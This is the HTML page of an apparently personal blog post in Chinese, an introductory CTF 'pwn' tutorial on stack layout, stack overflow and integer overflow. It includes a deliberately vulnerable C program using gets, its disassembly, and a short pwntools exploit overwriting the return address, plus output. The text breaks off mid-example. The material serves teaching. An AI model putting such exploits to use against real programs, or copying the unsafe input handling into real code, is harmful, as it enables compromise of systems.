@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/my_ico.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/my_ico.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/my_ico.ico">
+  <link rel="mask-icon" href="/images/my_ico.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lylanfree.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="CTF中的pwn指的是通过通过程序本身的漏洞，编写利用脚本破解程序拿到主机的权限，这就需要对程序进行分析，了解操作系统的特性和相关漏洞，是一个难度比较大的分支。 其分类有：栈溢出、堆溢出、整数溢出、格式化字符串漏洞等。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN">
+<meta property="og:url" content="http://lylanfree.github.io/2022/09/13/PWN/index.html">
+<meta property="og:site_name" content="lylanfree&#39;s blog">
+<meta property="og:description" content="CTF中的pwn指的是通过通过程序本身的漏洞，编写利用脚本破解程序拿到主机的权限，这就需要对程序进行分析，了解操作系统的特性和相关漏洞，是一个难度比较大的分支。 其分类有：栈溢出、堆溢出、整数溢出、格式化字符串漏洞等。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://lylanfree.github.io/2022/09/13/PWN/image-20220913172349359.png">
+<meta property="og:image" content="http://lylanfree.github.io/2022/09/13/PWN/image-20220913172359745.png">
+<meta property="og:image" content="http://lylanfree.github.io/2022/09/13/PWN/image-20220913172411988.png">
+<meta property="article:published_time" content="2022-09-13T09:22:47.000Z">
+<meta property="article:modified_time" content="2022-09-13T09:24:42.386Z">
+<meta property="article:author" content="lylanfree">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="share">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lylanfree.github.io/2022/09/13/PWN/image-20220913172349359.png">
+
+<link rel="canonical" href="http://lylanfree.github.io/2022/09/13/PWN/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>PWN | lylanfree's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lylanfree's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://lylanfree.github.io/2022/09/13/PWN/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="lylanfree">
+      <meta itemprop="description" content="持续学习的程序员">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lylanfree's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PWN
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-09-13 17:22:47 / Modified: 17:24:42" itemprop="dateCreated datePublished" datetime="2022-09-13T17:22:47+08:00">2022-09-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>7.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CTF中的pwn指的是通过通过程序本身的漏洞，编写利用脚本破解程序拿到主机的权限，这就需要对程序进行分析，了解操作系统的特性和相关漏洞，是一个难度比较大的分支。</p>
+<p>其分类有：栈溢出、堆溢出、整数溢出、格式化字符串漏洞等。</p>
+<span id="more"></span>
+<h2 id="基础知识准备">基础知识准备</h2>
+<p>Pwn相对于CTF其他科目，需要更专业的技能和知识，主要学会如何分析程序，需要足够的知识储备。其中需要准备的知识有：</p>
+<ul>
+<li>c语言</li>
+<li>汇编语言</li>
+<li>python</li>
+<li>操作系统</li>
+<li>linux操作</li>
+</ul>
+<blockquote>
+<p>C语言：当下的比赛大部分的pwn题目的程序都是利用C语言或者C++编写的，IDA的反编译功能也是将二进制变成C/C++，理解并能运用C语言，对于分析程序有很大的帮助。</p>
+<p>汇编语言：pwn无法绕过汇编，分析程序首先面对的就是汇编，对于汇编需要有一定的基础，目前掌握x86汇编即可。</p>
+<p>Python：用来编写exp，python集成了一个专门用于pwn的库–pwntools，方便使用编写exp脚本。</p>
+<p>操作系统：需要了解一定的知识，特别是linux操作系统，栈和堆以及一些操作系统特性造成的漏洞都是我们解题的思路。</p>
+<p>linux操作：掌握基础的linux操作命令。</p>
+</blockquote>
+<h2 id="栈溢出">栈溢出</h2>
+<h3 id="栈结构">栈结构</h3>
+<p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示。两种操作都操作栈顶，当然，它也有栈底。</p>
+<figure>
+<img src="/2022/09/13/PWN/image-20220913172349359.png" alt="stack"><figcaption aria-hidden="true">stack</figcaption>
+</figure>
+<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的。</strong></p>
+<h3 id="函数调用栈">函数调用栈</h3>
+<h4 id="寄存器分配">寄存器分配</h4>
+<figure>
+<img src="/2022/09/13/PWN/image-20220913172359745.png" alt="reg"><figcaption aria-hidden="true">reg</figcaption>
+</figure>
+<h4 id="栈帧结构">栈帧结构</h4>
+<p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p>
+<p>编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p>
+<p>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</p>
+<figure>
+<img src="/2022/09/13/PWN/image-20220913172411988.png" alt="func_stack"><figcaption aria-hidden="true">func_stack</figcaption>
+</figure>
+<h4 id="堆栈操作">堆栈操作</h4>
+<p>函数调用时的具体步骤如下：</p>
+<ol type="1">
+<li>主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</li>
+<li>主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</li>
+<li>若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</li>
+<li>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</li>
+<li>被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</li>
+<li>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</li>
+<li>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</li>
+<li>被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</li>
+<li>主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</li>
+</ol>
+<p>步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p>
+<h3 id="栈溢出原理">栈溢出原理</h3>
+<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。因此，发生栈溢出的基本前提是：</p>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+<h4 id="示例">示例</h4>
+<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序的主要目的读取一个字符串，并将其输出。我们希望可以控制程序执行 <strong>success 函数</strong>。</p>
+<p><strong>gets</strong>本身是一个<strong>危险函数</strong>。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出。</p>
+<p>利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数。可以看到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+<pre><code>           +----------------+
+           |     retaddr    |
+           +----------------+
+           |    saved ebp   |
+     ebp--&gt;+----------------+
+           |                |
+           |                |
+           |                |
+           |                |
+           |                |
+           |                |
+s,ebp-0x14--&gt;+----------------+</code></pre>
+<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0804843B success         proc near</span><br><span class="line">.text:0804843B                 push    ebp</span><br><span class="line">.text:0804843C                 mov     ebp, esp</span><br><span class="line">.text:0804843E                 sub     esp, 8</span><br><span class="line">.text:08048441                 sub     esp, 0Ch</span><br><span class="line">.text:08048444                 push    offset s        ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08048449                 call    _puts</span><br><span class="line">.text:0804844E                 add     esp, 10h</span><br><span class="line">.text:08048451                 nop</span><br><span class="line">.text:08048452                 leave</span><br><span class="line">.text:08048453                 retn</span><br><span class="line">.text:08048453 success         endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如果我们写入的字符串为：<code>0x14*'a'+'bbbb'+success_addr</code></p>
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<pre><code>               +----------------+
+               |    0x0804843B  |
+               +----------------+
+               |       bbbb     |
+         ebp--&gt;+----------------+
+               |                |
+               |                |
+               |                |
+               |                |
+               |                |
+               |                |
+   s,ebp-0x14-&gt;+----------------+</code></pre>
+<p>需要注意的是，在计算机内存中，每个值都是按照字节存储的。X86架构采用小端存储，即 0x0804843B 在内存中的形式是 <strong>3b</strong></p>
+<p>可以编写exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>执行代码，可以得到</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  stack-example python exp.py</span><br><span class="line">[+] Starting local process &#x27;./stack_example&#x27;: pid 61936</span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 61936)</span></span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>
+<p>可以看到我们确实已经执行 success 函数。</p>
+<h4 id="栈溢出步骤">栈溢出步骤</h4>
+<ol type="1">
+<li><strong>寻找危险函数</strong></li>
+</ol>
+<p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下：</p>
+<ul>
+<li>输入
+<ul>
+<li>gets，直接读取一行，忽略''</li>
+<li>scanf</li>
+<li>vscanf</li>
+</ul></li>
+<li>输出
+<ul>
+<li>sprintf</li>
+</ul></li>
+<li>字符串
+<ul>
+<li>strcpy，字符串复制，遇到''停止</li>
+<li>strcat，字符串拼接，遇到''停止</li>
+<li>bcopy</li>
+</ul></li>
+</ul>
+<ol start="2" type="1">
+<li><strong>确定填充长度</strong></li>
+</ol>
+<p>这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li>覆盖函数返回地址，这时候就是直接看 EBP 即可。</li>
+<li>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。</li>
+<li>覆盖 bss 段某个变量的内容。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
+<p>栈溢出其他类型：ret2text、ret2shellcode、ret2syscall、ret2libc（ROP）、stack-pivoting。</p>
+<h3 id="例题">例题</h3>
+<h2 id="整数溢出">整数溢出</h2>
+<h3 id="c语言整数类型">C语言整数类型</h3>
+<p>在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，如下所示:</p>
+<table>
+<colgroup>
+<col style="width: 19%">
+<col style="width: 14%">
+<col style="width: 65%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>类型</th>
+<th>字节</th>
+<th>范围</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>short int</td>
+<td>2字节（word）</td>
+<td>0<sub>32767(0</sub>0x7fff) -32768<sub>-1(0x8000</sub>0xffff)</td>
+</tr>
+<tr class="even">
+<td>unsigned short int</td>
+<td>2byte(word)</td>
+<td>0<sub>65535(0</sub>0xffff)</td>
+</tr>
+<tr class="odd">
+<td>int</td>
+<td>4byte(dword)</td>
+<td>0<sub>2147483647(0</sub>0x7fffffff) -2147483648<sub>-1(0x80000000</sub>0xffffffff)</td>
+</tr>
+<tr class="even">
+<td>unsigned int</td>
+<td>4byte(dword)</td>
+<td>0<sub>4294967295(0</sub>0xffffffff)</td>
+</tr>
+<tr class="odd">
+<td>long int</td>
+<td>8byte(qword)</td>
+<td>正: 0~0x7fffffffffffffff 负: 0x8000000000000000~0xffffffffffffffff</td>
+</tr>
+<tr class="even">
+<td>unsigned long int</td>
+<td>8byte(qword)</td>
+<td>0~0xffffffffffffffff</td>
+</tr>
+</tbody>
+</table>
+<p>当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。</p>
+<h3 id="溢出原理">溢出原理</h3>
+<h4 id="上界溢出">上界溢出</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码</span></span><br><span class="line"><span class="type">short</span> <span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line">a = a + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 对应的汇编</span><br><span class="line">movzx  eax, word ptr [rbp - 0x1c]</span><br><span class="line">add    eax, 1</span><br><span class="line">mov    word ptr [rbp - 0x1c], ax</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">b = b + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># assembly code</span><br><span class="line">add    word ptr [rbp - 0x1a], 1</span><br></pre></td></tr></table></figure>
+<p>上界溢出有两种情况，一种是 0x7fff + 1， 另一种是 0xffff + 1。</p>
+<p>因为计算机底层指令是不区分有符号和无符号的，数据都是以二进制形式存在 (编译器的层面才对有符号和无符号进行区分，产生不同的汇编指令)。</p>
+<p>所以 add 0x7fff, 1 == 0x8000，这种上界溢出对无符号整型就没有影响，但是在有符号短整型中，0x7fff 表示的是 32767，但是 0x8000 表示的是 -32768，用数学表达式来表示就是在有符号短整型中 32767+1 == -32768。</p>
+<p>第二种情况是 add 0xffff, 1，这种情况需要考虑的是第一个操作数。</p>
+<p>比如上面的有符号型加法的汇编代码是 add eax, 1，因为 eax=0xffff，所以 add eax, 1 == 0x10000，但是无符号的汇编代码是对内存进行加法运算 add word ptr [rbp - 0x1a], 1 == 0x0000。</p>
+<p>在有符号的加法中，虽然 eax 的结果为 0x10000，但是只把 ax=0x0000 的值储存到了内存中，从结果看和无符号是一样的。</p>
+<p>再从数字层面看看这种溢出的结果，在有符号短整型中，0xffff==-1，-1 + 1 == 0，从有符号看这种计算没问题。</p>
+<p>但是在无符号短整型中，0xffff == 65535, 65535 + 1 == 0。</p>
+<h4 id="下界溢出">下界溢出</h4>
+<p>下届溢出的道理和上界溢出一样，在汇编代码中，只是把 add 替换成了 sub。</p>
+<p>一样也是有两种情况：</p>
+<p>第一种是 sub 0x0000, 1 == 0xffff，对于有符号来说 0 - 1 == -1 没问题，但是对于无符号来说就成了 0 - 1 == 65535。</p>
+<p>第二种是 sub 0x8000, 1 == 0x7fff，对于无符号来说是 32768 - 1 == 32767 是正确的，但是对于有符号来说就变成了 -32768 - 1 = 32767。</p>
+<h3 id="示例-1">示例</h3>
+<p>整数溢出的漏洞中，可以总结为两种情况。分别是：<code>未限制范围</code>和<code>错误的类型转换</code></p>
+<h4 id="未限制范围">未限制范围</h4>
+<p>这种情况很好理解，比如有一个固定大小的桶，往里面倒水，如果你没有限制倒入多少水，那么水则会从桶中溢出来。</p>
+<p>一个有固定大小的东西，你没有对其进行约束，就会造成不可预期的后果。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> test.c</span><br><span class="line"><span class="comment">#include&lt;stddef.h&gt;</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int len;</span><br><span class="line">    int data_len;</span><br><span class="line">    int header_len;</span><br><span class="line">    char *buf;</span><br><span class="line"></span><br><span class="line">    header_len = 0x10;</span><br><span class="line">    scanf(<span class="string">&quot;%uld&quot;</span>, &amp;data_len);</span><br><span class="line"></span><br><span class="line">    len = data_len+header_len</span><br><span class="line">    buf = malloc(len);</span><br><span class="line">    <span class="built_in">read</span>(0, buf, data_len);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc test.c</span><br><span class="line">$ ./a.out</span><br><span class="line">-1</span><br><span 